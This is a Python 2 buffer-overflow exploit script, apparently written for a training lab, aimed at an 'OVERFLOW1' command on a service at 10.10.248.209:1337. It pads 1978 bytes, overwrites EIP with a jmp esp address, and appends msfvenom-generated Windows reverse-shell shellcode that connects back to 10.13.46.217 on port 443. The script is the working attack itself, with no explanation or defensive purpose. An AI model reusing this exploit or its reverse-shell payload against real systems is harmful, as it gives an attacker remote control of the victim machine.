#!/usr/bin/python

import sys
import socket, time
from struct import *


remoteip="10.10.248.209"
remoteport=1337
offset= "A"* 1978
# jmp esp 625011AF
eip=pack('<L',0x625011AF)
#badchar \x00\x07\x2e\xa0
#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x07\x2e\xa0" -v esp -f python
esp =  b"\x90" * 16
esp += b"\xd9\xc2\xd9\x74\x24\xf4\xba\x90\xf1\x92\xe0\x5b\x29"
esp += b"\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\xc3\xe2\x70"
esp += b"\x15\x1f\xec\xf7\xd6\xdf\xed\x97\x5f\x3a\xdc\x97\x04"
esp += b"\x4f\x4f\x28\x4e\x1d\x7c\xc3\x02\xb5\xf7\xa1\x8a\xba"
esp += b"\xb0\x0c\xed\xf5\x41\x3c\xcd\x94\xc1\x3f\x02\x76\xfb"
esp += b"\x8f\x57\x77\x3c\xed\x9a\x25\x95\x79\x08\xd9\x92\x34"
esp += b"\x91\x52\xe8\xd9\x91\x87\xb9\xd8\xb0\x16\xb1\x82\x12"
esp += b"\x99\x16\xbf\x1a\x81\x7b\xfa\xd5\x3a\x4f\x70\xe4\xea"
esp += b"\x81\x79\x4b\xd3\x2d\x88\x95\x14\x89\x73\xe0\x6c\xe9"
esp += b"\x0e\xf3\xab\x93\xd4\x76\x2f\x33\x9e\x21\x8b\xc5\x73"
esp += b"\xb7\x58\xc9\x38\xb3\x06\xce\xbf\x10\x3d\xea\x34\x97"
esp += b"\x91\x7a\x0e\xbc\x35\x26\xd4\xdd\x6c\x82\xbb\xe2\x6e"
esp += b"\x6d\x63\x47\xe5\x80\x70\xfa\xa4\xcc\xb5\x37\x56\x0d"
esp += b"\xd2\x40\x25\x3f\x7d\xfb\xa1\x73\xf6\x25\x36\x73\x2d"
esp += b"\x91\xa8\x8a\xce\xe2\xe1\x48\x9a\xb2\x99\x79\xa3\x58"
esp += b"\x59\x85\x76\xce\x09\x29\x29\xaf\xf9\x89\x99\x47\x13"
esp += b"\x06\xc5\x78\x1c\xcc\x6e\x12\xe7\x87\x9a\xee\xc9\x8e"
esp += b"\xf3\xf2\x15\x30\xbf\x7a\xf3\x58\xaf\x2a\xac\xf4\x56"
esp += b"\x77\x26\x64\x96\xad\x43\xa6\x1c\x42\xb4\x69\xd5\x2f"
esp += b"\xa6\x1e\x15\x7a\x94\x89\x2a\x50\xb0\x56\xb8\x3f\x40"
esp += b"\x10\xa1\x97\x17\x75\x17\xee\xfd\x6b\x0e\x58\xe3\x71"
esp += b"\xd6\xa3\xa7\xad\x2b\x2d\x26\x23\x17\x09\x38\xfd\x98"
esp += b"\x15\x6c\x51\xcf\xc3\xda\x17\xb9\xa5\xb4\xc1\x16\x6c"
esp += b"\x50\x97\x54\xaf\x26\x98\xb0\x59\xc6\x29\x6d\x1c\xf9"
esp += b"\x86\xf9\xa8\x82\xfa\x99\x57\x59\xbf\xba\xb5\x4b\xca"
esp += b"\x52\x60\x1e\x77\x3f\x93\xf5\xb4\x46\x10\xff\x44\xbd"
esp += b"\x08\x8a\x41\xf9\x8e\x67\x38\x92\x7a\x87\xef\x93\xae"
buffer = offset + eip + esp

while True:

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send("OVERFLOW1 " + buffer + '\r\n')
    print s.recv(1024)
    s.close()
    time.sleep(1)
    print "-------------------------"
